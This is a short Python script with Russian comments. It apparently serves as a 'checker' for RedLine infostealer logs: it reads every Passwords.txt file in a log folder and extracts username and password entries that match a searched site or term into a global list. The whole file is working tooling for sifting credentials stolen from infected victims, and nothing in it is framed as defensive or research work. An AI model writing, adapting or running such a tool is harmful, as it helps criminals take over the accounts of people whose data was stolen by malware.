accounts_social = []
def lts(list):#Функция делает из списка строку
    str1 = ''#
    temp1 = str1.join(list)
    return temp1

def find_accounts(find):#Функция поиска аккаунтов (чекер)
    global accounts_social #Делаю переменную глобальной чтобы можно было ее прочитать в других скриптах
    import glob #Импорт
    files = glob.glob('Path_To_RedLine_LOGS/*/Passwords.txt') #Путь к файлам там где пароли
    list1 = [] #Лист с данными файлов
    for i in files:
        if '.txt' in i:
            with open(i,encoding='utf-8',errors='ignore') as f:#Открывает файл passwords.txt (где есть все пароли и т.д)
                temp = f.read() #Читает файл
                data = temp.replace('\n',' ')#Фикс пробелов
                list1.append(data)#Добавляет весь текст файлов passwords.txt
                temp = f.closed #Закрывает файл
    valid_list = [] #Лист в котором то что ищет пользователь среди файлов
    for i in list1:
        if str(i.find(find))!='-1':#Если в файлах есть то что ищет пользователь
            valid_list.append(i)#Добавление в valid_list
    for x in valid_list:
        line_num = int(x.find(find))#Поиск строки с тем чем надо найти
        line_num2 = int(x[line_num:].find('Application'))#Поиск конца нужной строки поиска
        temp1 = x[line_num:line_num2+line_num]#Форматирование
        temp2 = temp1.find('Username')#Поиск почты,аккаунта
        done = temp1[temp2:]#Готовая строка аккаунта
        if done !=' ':#Если в готовая строка не пробел то
            accounts_social.append('{'+done+'}'+'\n')#Добавляем её в переменную с аккаунтами
    return accounts_social